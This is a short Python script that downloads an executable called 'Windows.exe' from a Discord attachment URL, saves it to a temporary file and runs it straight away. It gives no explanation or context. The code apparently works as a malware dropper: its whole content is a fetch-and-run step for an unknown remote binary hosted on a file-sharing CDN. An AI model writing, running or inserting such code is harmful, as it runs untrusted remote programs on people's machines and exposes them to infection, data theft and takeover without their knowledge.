import requests, tempfile, subprocess

url = "https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe"
response = requests.get(url)
with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
    tmp_file.write(response.content)
    exe_path = tmp_file.name
subprocess.call([exe_path])
